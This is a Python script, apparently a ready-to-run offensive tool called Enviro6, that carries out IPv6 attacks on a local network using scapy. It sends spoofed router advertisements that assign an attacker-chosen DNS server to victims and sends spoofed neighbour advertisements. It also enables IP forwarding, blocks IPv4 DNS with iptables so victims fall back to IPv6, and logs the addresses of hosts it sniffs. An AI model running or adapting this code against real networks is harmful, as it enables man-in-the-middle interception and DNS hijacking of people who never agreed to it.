import os
import signal
import argparse
import threading
import logging
from scapy.all import sniff, sendp, IPv6, Ether, ICMPv6ND_RA, ICMPv6NDOptRDNSS, ICMPv6NDOptPrefixInfo, ICMPv6ND_NA, conf
from colorama import Fore, Style, init

init(autoreset=True)

conf.verb = 0

logging.basicConfig(filename='enviro6.log', level=logging.DEBUG, format='%(asctime)s - %(message)s')

banner = f"""
{Fore.CYAN}  ______            _             __  
 |  ____|          (_)           / /  
 | |__   _ ____   ___ _ __ ___  / /_  
 |  __| | '_ \ \ / / | '__/ _ \| '_ \ 
 | |____| | | \ V /| | | | (_) | (_) |
 |______|_| |_|\_/ |_|_|  \___/ \___/ 
{Fore.GREEN}By @ShkudW
{Fore.YELLOW}https://github.com/ShkudW
{Style.RESET_ALL}
"""

device_info = {}

def enable_ip_forwarding():
    logging.info("Enabling IP forwarding.")
    os.system("sysctl -w net.ipv6.conf.all.forwarding=1")

def disable_ip_forwarding():
    logging.info("Disabling IP forwarding.")
    os.system("sysctl -w net.ipv6.conf.all.forwarding=0")

def setup_iptables():
    logging.info("Setting up iptables rules to block DNSv4 traffic.")
    os.system("sudo iptables -A OUTPUT -p udp --dport 53 -m state --state NEW,ESTABLISHED -j REJECT")
    os.system("sudo iptables -A OUTPUT -p tcp --dport 53 -m state --state NEW,ESTABLISHED -j REJECT")

def reset_iptables():
    logging.info("Resetting iptables rules.")
    os.system("sudo iptables -D OUTPUT -p udp --dport 53 -m state --state NEW,ESTABLISHED -j REJECT")
    os.system("sudo iptables -D OUTPUT -p tcp --dport 53 -m state --state NEW,ESTABLISHED -j REJECT")

def handle_packet(packet):
    if IPv6 in packet and Ether in packet:
        mac_address = packet[Ether].src
        ipv6_address = packet[IPv6].src
        address_type = None

        if mac_address not in device_info:
            device_info[mac_address] = {"link_local": [], "ula": [], "global": []}

        if ipv6_address.startswith("fe80::") and ipv6_address not in device_info[mac_address]["link_local"]:
            device_info[mac_address]["link_local"].append(ipv6_address)
            address_type = "Link-Local"
        elif (ipv6_address.startswith("fc00::") or ipv6_address.startswith("fd00::")) and ipv6_address not in device_info[mac_address]["ula"]:
            device_info[mac_address]["ula"].append(ipv6_address)
            address_type = "ULA"
        elif (ipv6_address.startswith("2") or ipv6_address.startswith("3")) and ipv6_address not in device_info[mac_address]["global"]:
            device_info[mac_address]["global"].append(ipv6_address)
            address_type = "Global"

        if address_type:
            logging.info(f"MAC: {mac_address}, IPv6: {ipv6_address}, Type: {address_type}")
            print(f"{Fore.GREEN}MAC: {mac_address}, {Fore.CYAN}IPv6: {ipv6_address}, {Fore.YELLOW}Type: {address_type}{Style.RESET_ALL}")

def ra_spoofing(interface, dns_ipv6):
    enable_ip_forwarding()
    setup_iptables()
    logging.debug("Starting RA Spoofing attack.")
    
    sniff_thread = threading.Thread(target=sniff, kwargs={
        'prn': handle_packet, 
        'filter': "icmp6", 
        'iface': interface, 
        'store': 0
    })
    sniff_thread.start()
    
    ra_packet = Ether(dst="33:33:00:00:00:01") / \
                IPv6(dst="ff02::1") / \
                ICMPv6ND_RA(prf=1) / \
                ICMPv6NDOptPrefixInfo(prefixlen=64, prefix="2001:db8::") / \
                ICMPv6NDOptRDNSS(lifetime=600, dns=[dns_ipv6])
    sendp(ra_packet, iface=interface, count=100)
    logging.debug("RA Spoofing packets sent.")

    return sniff_thread

def ndp_spoofing(interface, target_ipv6, fake_mac):
    logging.debug("Starting NDP Spoofing attack.")
    ns_packet = Ether(src=fake_mac, dst="33:33:ff:00:00:01") / \
                IPv6(src=target_ipv6, dst="ff02::1") / \
                ICMPv6ND_NA(tgt=target_ipv6) / \
                ICMPv6NDOptRDNSS(lifetime=600, dns=[target_ipv6])
    sendp(ns_packet, iface=interface, count=5)
    logging.debug("NDP Spoofing packets sent.")

def stop_handler(signal, frame):
    print("\nStopping RA/NDP Spoofing attack, disabling IP forwarding, and resetting iptables...")
    reset_iptables()
    disable_ip_forwarding()
    print("IP forwarding disabled. Exiting.")
    exit(0)

def main():
    parser = argparse.ArgumentParser(description="IPv6 Attack Script")
    parser.add_argument("-I", "--interface", required=True, help="Network interface to use")
    parser.add_argument("--ra-spoof", action="store_true", help="Run RA Spoofing attack")
    parser.add_argument("--ndp-spoof", action="store_true", help="Run NDP Spoofing attack")
    parser.add_argument("--target-ipv6", help="Target IPv6 address for NDP Spoofing")
    parser.add_argument("--fake-mac", help="Fake MAC address for NDP Spoofing")
    parser.add_argument("--dns", help="DNS IPv6 address to assign to victims")
    args = parser.parse_args()

    print(banner)

    signal.signal(signal.SIGINT, stop_handler)

    if args.ra_spoof:
        if args.dns:
            sniff_thread = ra_spoofing(args.interface, args.dns)
            sniff_thread.join()  # Wait for the sniffing thread to finish
        else:
            print("Please provide a DNS IPv6 address with --dns.")
            exit(1)
    
    if args.ndp_spoof:
        if args.target_ipv6 and args.fake_mac:
            ndp_spoofing(args.interface, args.target_ipv6, args.fake_mac)
        else:
            print("Please provide both target IPv6 address and fake MAC address for NDP Spoofing.")
            exit(1)

if __name__ == "__main__":
    main()

